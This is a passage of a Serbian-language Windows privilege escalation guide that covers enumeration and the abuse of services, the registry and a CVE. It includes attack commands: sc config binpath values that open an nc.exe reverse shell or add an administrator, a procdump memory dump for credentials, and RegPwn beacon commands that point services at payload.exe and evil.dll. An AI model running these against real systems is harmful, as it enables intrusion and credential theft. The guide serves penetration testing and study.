**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti pristupne podatke sačuvane na uređaju od pretnji kao što su napadi pass-the-hash. [**Više informacija o funkciji Credential Guard dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditive domena** autentifikuje **Local Security Authority** (LSA), a koriste ih komponente operativnog sistema. Kada bezbednosni paket registrovan za korisnika autentifikuje njegove podatke za prijavu, obično se uspostavljaju akreditivi domena za tog korisnika.\
[**Više informacija o keširanim akreditivima ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Izlistavanje korisnika i grupa

Trebalo bi da proveriš da li neka od grupa kojima pripadaš ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda ćete moći da eskalirate privilegije**. Saznajte više o privilegovanim grupama i tome kako da ih zloupotrebite za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i tome kako da ih zloupotrebite:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / sesije

```bash
qwinsta
klist sessions
```

### Korisničke fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzmite sadržaj međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za fajlove i fascikle

Pre svega, prilikom pregleda procesa **proverite da li se u komandnoj liniji procesa nalaze lozinke**.\
Proverite da li možete da **prepišete neki pokrenuti binarni fajl** ili imate dozvole za upis u fasciklu sa binarnim fajlovima kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md); mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može kratko da traje, pa njegovo odsustvo sa jednog pasivnog snimka portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug flag ne dokazuju izvršavanje koda između korisnika. Rutinsko prikupljanje podataka obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola nad binarnim datotekama procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola fascikli u kojima se nalaze binarne datoteke procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Direktorijumi dinamičkih pretprocesora za Snort

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Za zakazani zadatak ili servis koji pokreće Snort pod drugim nalogom, pregledajte baš tu konfiguraciju i ACL direktorijuma navedenog za module. Ako vaš token može da kreira datoteke u tom direktorijumu, putanja je kandidat za proveru mogućnosti izvršavanja koda pri sledećem učitavanju modula tog zadatka ili servisa. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja deny ili share; sama mogućnost upisivanja u direktorijum ne dokazuje eskalaciju. [Dokumentacija za Snort-ove dinamičke pretprocesore](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani veb-servis sa korenom dokumenata u koji može da se upisuje

Na Windows instalaciji Apache-a uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa vrednošću `DocumentRoot` u aktivnoj datoteci `httpd.conf`. Za uobičajen raspored XAMPP-a pregledajte `C:\xampp\apache\conf\httpd.conf` i ACL konfigurisanog korena dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, izvršavanje koda na serverskoj strani može preći granicu privilegija hosta. Potvrdite da servis radi, da se sadržaj poslužuje sa tačno te putanje i da rukovalac na serverskoj strani obrađuje taj tip datoteke; mogućnost upisivanja u koren sama po sebi dokazuje samo mogućnost kreiranja datoteka. Pregledajte ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za konvencionalnu WAMP instalaciju, servis može da pokazuje na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), a konfiguracija se nalazi pored njega, u `conf\httpd.conf`, dok je podrazumevani korenski direktorijum `C:\wamp64\www` ili `C:\wamp\www`. Proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se pokreće, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i izmene za virtual host), kao i ACL korenskog direktorijuma. To što je WAMP direktorijum upisiv ne dokazuje da Apache radi kao `SYSTEM` niti da izvršava poslatu datoteku. [Apache objašnjava kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS korenski direktorijum i mrežni identitet application pool-a

Za IIS, povežite fizički direktorijum u koji može da se upisuje sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji je pool konfigurisan za njega i koji handler radi na serveru. Kod postavljen u direktorijum koji se servira izvršava se kao pool samo ako IIS obrađuje taj tip datoteke i ako je ruta dostupna. Proverite efektivan pristup trenutnog korisnika za kreiranje datoteka, stanje izvršavanja sajta, handler i izmene za konkretnu putanju pre nego što upisiv direktorijum smatrate putem do izvršavanja koda.

Dinamička kompilacija ASP.NET-a uvodi još jednu putanju koju treba proveriti: generisane datoteke u direktorijumu za kompilaciju aplikacije. Podrazumevano je to direktorijum `Temporary ASP.NET Files` ispod odgovarajuće instalacije .NET Framework-a, ali `<compilation tempDirectory>` u aplikaciji može da promeni njegovu lokaciju. [Microsoft dokumentuje lokaciju i poddirektorijume za pojedinačne aplikacije](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompilaciju kada application pool-ovi ne veruju jedni drugima](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni generisani izvorni kod u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom worker procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). ACL datoteke ili direktorijuma sam po sebi ne dokazuje izvršavanje koda: proverite povezanost keša sa aktivnom aplikacijom, efektivni token i ACL, postavke kompilacije, identitet procesa i vreme eventualne ponovne kompilacije. Koristite pregled metapodataka samo za čitanje; tokom enumeracije nemojte pokretati kompilaciju niti menjati datoteke keša.

IIS pool konfigurisan kao `ApplicationPoolIdentity` ili `NetworkService` obično se autentifikuje prema resursima domena koristeći **nalog računara-domaćina**, iako njegove lokalne privilegije mogu biti niske. `LocalSystem` već ima visoke lokalne privilegije i takođe koristi nalog računara na mreži; `LocalService` obično koristi anonimne mrežne akreditive. Pool `SpecificUser` koristi umesto toga nalog koji je za njega konfigurisan. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet application pool-a](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako postavka identiteta nije navedena, mogu da se naslede podrazumevane vrednosti pool-a, koje se razlikuju među generacijama IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu naziva pool-a. Ako izvršavanje koda dosegne pool koji na mreži koristi identitet računara, proverite prava direktorijuma koja ima **taj konkretan računar**. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava replikacije nad kontekstom imenovanja domena; samo mašinski ticket ili uloga hosta nisu dokaz da ta prava postoje. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove bez otpremanja datoteke, uspostavljanja mrežne autentifikacije ili zahtevanja ticket-a.

Kod čitljivog ASP.NET handler-a koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Handler koji spaja dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može da dozvoli shell metaznakovima da izmene komandu; [Microsoft dokumentuje specijalne znakove u `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdan pozivalac zaista može da utiče na dekodiranu vrednost i dosegne handler, a zatim razrešite efektivni identitet application pool-a ili impersonation identitet, kao i identitet podređenog procesa. Čitljiva izvorna linija, localhost listener ili slabost formata tokena sami po sebi ne dokazuju privilegovano izvršavanje komandi. Pregledajte izvorni kod i konfiguraciju pool-a, ne šaljući фалсификоване захтеве нити покрећући helper током пасивне енумерације.

Для PHP сервиса на Windows-у, путања под контролом захтева прослеђена функцији [`include` или `require`](https://www.php.net/manual/en/function.include.php) може да изврши PHP датотеку коју може да мења корисник са нижим привилегијама, под идентитетом worker-а. Потврдите да захтев може да досегне ту наредбу, да разрешена путања указује на датотеку коју корисник са нижим привилегијама може да измени и коју worker може да чита, да важећа PHP ограничења путања дозвољавају укључивање и да worker заиста ради са вишим привилегијама. Loopback listener или уписива датотека сами по себи не доказују овај ланац; прегледајте изворни код, идентитет сервиса и ACL-ове датотека без позивања endpoint-а током пасивне енумерације.

### Проналажење лозинки у меморији

Помоћу **procdump** алатке из Sysinternals-а можете да направите дамп меморије покренутог процеса. Сервиси попут FTP-а имају **акредитиве у меморији у обичном тексту**; покушајте да направите дамп меморије и прочитате акредитиве.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nesigurne GUI aplikacije

**Aplikacije koje se izvršavaju kao SYSTEM mogu omogućiti korisniku da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), pretražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa povišenim privilegijama

Aplikacija koja automatski otvara projekte iz direktorijuma za odlaganje u koji može da upisuje korisnik sa nižim privilegijama prelazi granicu poverenja u ulazne podatke pod nalogom aplikacije koja ih uvozi. Proverite **tačnu putanju na koju može da se upisuje**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem sa otvaranjem/obnavljanjem Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je upotrebu spoljašnjih XML entiteta u metapodacima projekta; mrežni entitet u sistemu Windows mogao je da izazove autentifikaciju nalogom koji uvozi projekat, ako to dozvoljavaju [pravila za odlazni SMB i NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To je mogući put do izlaganja akreditiva, a ne neposrednog pristupa administratora: odgovor mora moći da se iskoristi drugim ovlašćenim ili ranjivim putem, a aktuelne verzije treba proceniti na osnovu stvarnog stanja zakrpa. Tokom pasivne enumeracije nemojte otvarati namenski napravljen projekat; pregledajte tok uvoza i ACL-ove.

## Usluge

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) na objektu Service Control Manager (SCM) odvojeno je od prava nad postojećom uslugom. Uspešan zahtev za pristup samo za čitanje preko [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo jeste povod za proveru, a ne dokaz da se nova usluga može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pristupom usluzi zatraženim prilikom njenog kreiranja; kasnije ponovno otvaranje usluge predstavlja zasebnu proveru pristupa i može da ne uspe čak i kada se mogao koristiti prvobitni handle. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog usluge, pravila pokretanja i putanju izvršne datoteke. Tokom pasivne enumeracije nemojte kreirati niti pokretati uslugu.

Za udaljeni put instalacije usluge povežite ta prava SCM-a sa deljenim resursom na ciljnom sistemu u koji **isto mrežno prijavljivanje** može da upisuje, pripadajućim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog usluge može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka prava SCM-a i odgovarajući put za postavljanje datoteka; administratorski deljeni resurs nije nužan uslov. Samo pristup upisa u deljeni resurs ili samo mogućnost kreiranja usluge putem SCM-a ne dokazuju da nova usluga može da se pokrene sa višim identitetom.

Postojeća usluga može da pozove pomoćnu izvršnu datoteku pri pokretanju, gašenju ili nekom drugom događaju životnog ciklusa, čak i kada ta pomoćna datoteka nije navedena u njenom `ImagePath`. Ako se naziv pomoćne datoteke razrešava u direktorijum u koji može da upisuje korisnik sa nižim privilegijama, a usluga se izvršava sa višim identitetom, nedostajuća pomoćna datoteka može biti kandidat za zamenu, pod određenim uslovima. Potvrdite **stvarni kod usluge ili dokumentovan poziv pomoćne datoteke**, razrešenu putanju izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet usluge i dostupan okidač životnog ciklusa. Direktorijum usluge u koji može da se upisuje ili sama nedostajuća datoteka ne dokazuju da će usluga učitati tu datoteku; tokom pasivne provere nemojte pokretati niti zaustavljati uslugu.

Za postojeću uslugu, [`SERVICE_START` omogućava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to se razlikuje od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pre nego što pristup pokretanju smatrate nečim višim od prava upravljanja, pregledajte kod usluge ili njен dokumentovani interfejs. Ako koristi argument koji je izabrao pozivalac kao putanju za zapisivanje dnevnika ili izvoz, proverite identitet usluge, tačan tok od argumenta do upisa, ograničenja putanje i dozvole nad **kreiranom datotekom**. Upis u zaštićeni direktorijum može dovesti do eskalacije samo ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; sama mogućnost upisa u dnevnik ili pravo pokretanja nisu dovoljni. Tokom pasivnog popisivanja nemojte pokretati uslugu niti kreirati probnu datoteku.

Kod agenta za nadzor NSClient++ čitljiva datoteka `nsclient.ini` predstavlja **povod za pregled konfiguracije**: može da sadrži veb-akreditive, dok `boot.ini` može da preusmeri konfiguraciju na drugu lokaciju. Proverite stvarni nalog usluge, WEB listener i pravila pristupa, kao i to da li autentifikovana uloga može da menja podešavanja ili skripte. Za izvršavanje sa povišenim privilegijama potrebni su i `CheckExternalScripts` (ili drugi omogućen put za izvršavanje), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom usluge. Listener dostupan samo preko loopback interfejsa i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili listener ne dokazuju postojanje tih prava. Tokom pasivne enumeracije pregledajte metapodatke i dozvole bez prikazivanja tajni ili pozivanja veb API-ja. Pogledajte [raspored datoteka NSClient++](https://nsclient.org/docs/concepts/file-layout/), [smernice za bezbednost veba i skripti](https://nsclient.org/docs/setup/securing/) i [konfiguraciju eksternih skripti](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Za uslugu čiji je `ImagePath` `nssm.exe`, pregledajte stvarni nalog pod kojim se usluga izvršava i njenu vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tu čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njen konfigurisani radni direktorijum. Proverite podređenu izvršnu datoteku i ACL-ove njenog nadređenog direktorijuma pre nego što dozvole omotača smatrate celom granicom usluge. Lokalna WCF ili SOAP krajnja tačka koju izlaže ta podređena aplikacija zaseban je povod za proveru: potvrdite da li je listener dostupan korisniku sa nižim privilegijama, da li tačna operacija prihvata njegov unos i da li podređena usluga izvršava nesigurnu operaciju sa višim identitetom. Nalog usluge, URL krajnje tačke ili putanja u koju može da se upisuje sami po sebi ne dokazuju eskalaciju; tokom pasivne enumeracije nemojte pozivati operacije usluge.

Za prilagođenu WCF operaciju pratite string kojim upravlja pozivalac do svakog PowerShell runspace-a. [`Pipeline.Commands.AddScript` dodaje tekst skripte](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` pokreće pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` sa Windows akreditivima za transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentifikuje klijenta, ali ovlašćenje za pozivanje baš te **određene** operacije i efektivni identitet runspace-a treba proveriti zasebno. Putanja od ulaza pozivaoca sa nižim privilegijama do `AddScript` pod identitetom usluge sa višim privilegijama predstavlja granicu za izvršavanje koda; port koji sluša, autentifikovani klijent ili neiskorišćena metoda u nepovezanom assembly-ju sami po sebi nisu dokaz. Statički pregledajte instaliranu uslugu, ugovor, ovlašćenja i podešavanja impersonacije, bez pozivanja krajnje tačke tokom enumeracije.

Service Triggers omogućavaju sistemu Windows da pokrene uslugu kada nastupe određeni uslovi (aktivnost imenovane cevi/RPC krajnje tačke, ETW događaji, dostupnost IP-a, priključenje uređaja, osvežavanje GPO-a itd.). Čak i bez prava SERVICE_START, često možete pokrenuti privilegovane usluge aktiviranjem njihovih okidača. Tehnike enumeracije i aktiviranja nalaze se ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usluga za prikupljanje dijagnostike u Visual Studio-u

Instalacije Visual Studio-a sa C/C++ alatima mogu da sadrže `VSStandardCollectorService150`, dijagnostičku uslugu konfigurisanu da se izvršava kao `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) koristio je junction i race condition sa object-manager link-om za preusmeravanje resetovanja DACL-a usluge. Pokazana eskalacija je takođe zahtevala upotrebljivu putanju za popravku MSI-ja dobavljača WMI-ja za Visual Studio Setup i ciljnu datoteku `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponenta je ispravljena u januaru 2024.

Za pasivnu trijažu pregledajte nalog i binarnu putanju te usluge, proverite da li postoji putanja do Setup WMI compiler-a i utvrdite stanje zakrpa instalirane komponente. Sama stavka usluge, verzija proizvoda Visual Studio ili datoteka compiler-a ne dokazuju da je sistem ranjiv. Provera ne zahteva pokretanje usluge niti izvršavanje popravke.

Nabavite listu usluga:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz _Sysinternals_ za proveru potrebnog nivoa privilegija za svaki servis.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li „Authenticated Users“ mogu da menjaju neku uslugu:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete preuzeti accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje usluge

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usluga se ne može pokrenuti jer je onemogućena ili zato što nijedan omogućen uređaj nije povezan sa njom._

Možete je omogućiti pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte na umu da servis upnphost za rad zavisi od SSDPSRV-a (u XP SP1)**

**Drugo zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmenite putanju binarne datoteke servisa**

Ako grupa „Authenticated users” ima **SERVICE_ALL_ACCESS** dozvole za servis, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje servisa

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati pomoću različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava promenu konfiguracije binarne datoteke servisa.
- **WRITE_DAC**: Omogućava promenu dozvola, čime se stiče mogućnost promene konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i promenu dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost promene konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost promene konfiguracije servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole nad binarnim datotekama servisa

Ako se servis pokreće kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili kao privilegovani domenski nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njenu nadređenu fasciklu**, servis se često može preoteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju servis izvršava** ili imate **dozvole za pisanje u fasciklu** u kojoj se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Pomoću **wmic** (ne u system32) možete da pronađete svaku binarnu datoteku koju servis izvršava, a zatim pomoću **icacls** proverite svoje dozvole:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL dozvole dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito **`(F)`**, **`(M)`** ili **`(W)`** na izvršnoj datoteci servisa ili direktorijumu koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Potvrdite nalog servisa i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Potvrdite da je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili validnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / okidač servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako servis ne dozvoljava običnom korisniku da ga ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima podešenu akciju pri otkazu koja ga ponovo pokreće ili može posredno da ga pokrene aplikacija koja ga koristi.

### Dozvole za izmenu registra servisa

Trebalo bi da proverite da li možete da izmenite neki registar servisa.\
Možete da **proverite** svoje **dozvole** nad **registrom** servisa na sledeći način:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za upis u registar na konkretnom ključu servisa. Sam ACL unos ne dokazuje efektivan pristup: važni su deny unosi, trenutni token i nasleđene dozvole. Prava nad ključem registra odvojena su od prava `SERVICE_CHANGE_CONFIG` i `SERVICE_START` nad objektom servisa. Za eskalaciju su takođe potrebni upotrebljivo polje konfiguracije servisa, način da se servis pokrene i identitet servisa sa višim privilegijama. Pogledajte Microsoft dokumentaciju o [pravima nad ključevima registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [pravima pristupa servisu](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili Path binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race uslov sa simboličkom vezom registra za upis proizvoljne HKLM vrednosti (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju per-user ključeve **ATConfig**, koje kasnije **SYSTEM** proces kopira u HKLM ključ sesije. **Race uslov** sa simboličkom vezom registra može da preusmeri taj privilegovani upis na **bilo koju HKLM putanju**, čime se dobija primitiva za upis proizvoljne HKLM **vrednosti**.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` sadrži spisak instaliranih funkcija pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijave/ prelazaka na bezbednu radnu površinu i korisnik može da upisuje u njega.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Podesite vrednost **HKCU ATConfig** koju želite da SYSTEM upiše.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Pobedeite u race uslovu** postavljanjem **oplock**-a na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite ključ **HKLM Session ATConfig** ključem registra koji je veza ka zaštićenoj HKLM ciljnoj putanji.
4. SYSTEM upisuje vrednost koju je odabrao napadač na preusmerenu HKLM putanju.

Kada dobijete mogućnost upisa proizvoljne HKLM vrednosti, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** kao deo race uslova.

Primer alata (RegPwn BOF / samostalni alat):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory nad registrom servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podregistre unutar njega**. Kod Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

